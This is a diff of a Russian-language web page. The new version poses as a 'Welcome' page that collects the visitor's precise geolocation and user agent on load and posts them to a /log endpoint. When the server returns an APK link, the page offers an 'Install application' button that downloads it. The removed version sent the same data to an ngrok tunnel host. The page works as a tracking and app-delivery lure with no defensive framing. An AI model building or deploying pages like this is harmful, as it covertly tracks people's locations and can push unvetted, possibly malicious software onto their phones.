@@ -1,91 +1,67 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <title>Геолокация</title>
+  <meta charset="UTF-8" />
+  <title>Добро пожаловать</title>
   <style>
-    body {
-      font-family: sans-serif;
-      margin: 0;
-      padding: 2rem;
-      background: #f7f7f7;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-    }
-    button {
-      padding: 1rem 2rem;
-      font-size: 16px;
-      background: #007bff;
+    body { font-family: Arial, sans-serif; padding: 20px; }
+    #status { margin-bottom: 15px; }
+    #installBtn {
+      display: none;
+      padding: 12px 20px;
+      background: #28a745;
       color: white;
       border: none;
-      border-radius: 8px;
+      border-radius: 5px;
+      font-size: 16px;
       cursor: pointer;
-    }
-    button:hover {
-      background: #0056b3;
-    }
-    #status {
-      margin-top: 1rem;
-      color: #333;
     }
   </style>
 </head>
 <body>
+  <h2>Добро пожаловать!</h2>
+  <p id="status">Получаем геолокацию...</p>
+  <button id="installBtn">Установить приложение</button>
 
-<h2>Отправка геолокации</h2>
-<button id="sendBtn">Отправить</button>
-<div id="status"></div>
+  <script>
+    const status = document.getElementById('status');
+    const installBtn = document.getElementById('installBtn');
 
-<script>
-  let geoData = null;
-
-  // Получаем геолокацию при загрузке
-  window.onload = () => {
     navigator.geolocation.getCurrentPosition(
-      pos => {
-        geoData = {
-          lat: pos.coords.latitude,
-          lon: pos.coords.longitude,
-          accuracy: pos.coords.accuracy,
+      async position => {
+        const geoData = {
+          lat: position.coords.latitude,
+          lon: position.coords.longitude,
+          accuracy: position.coords.accuracy,
           userAgent: navigator.userAgent,
           timestamp: new Date().toISOString()
         };
-        document.getElementById('status').textContent = "Геолокация получена. Нажмите 'Отправить'.";
+
+        try {
+          const res = await fetch('/log', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(geoData)
+          });
+
+          const result = await res.json();
+          if (result && result.apk) {
+            installBtn.style.display = 'inline-block';
+            installBtn.onclick = () => {
+              window.location.href = result.apk;
+            };
+            status.textContent = "Геолокация получена. Нажмите для установки приложения.";
+          } else {
+            status.textContent = "Геолокация получена, но установка не требуется.";
+          }
+        } catch (err) {
+          status.textContent = "Ошибка отправки геоданных.";
+        }
       },
       err => {
-        document.getElementById('status').textContent = "Ошибка геолокации: " + err.message;
+        status.textContent = "Ошибка геолокации: " + err.message;
       }
     );
-  };
-
-  // Кнопка отправки
-  document.getElementById('sendBtn').addEventListener('click', async () => {
-    if (!geoData) {
-      document.getElementById('status').textContent = "Геолокация недоступна.";
-      return;
-    }
-
-    try {
-      const response = await fetch('https://c684-82-200-150-82.ngrok-free.app/log', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(geoData)
-      });
-
-      if (response.ok) {
-        document.getElementById('status').textContent = "Успешно отправлено.";
-      } else {
-        document.getElementById('status').textContent = "Ошибка отправки.";
-      }
-    } catch (e) {
-      document.getElementById('status').textContent = "Ошибка соединения.";
-    }
-  });
-</script>
-
+  </script>
 </body>
 </html>
-s
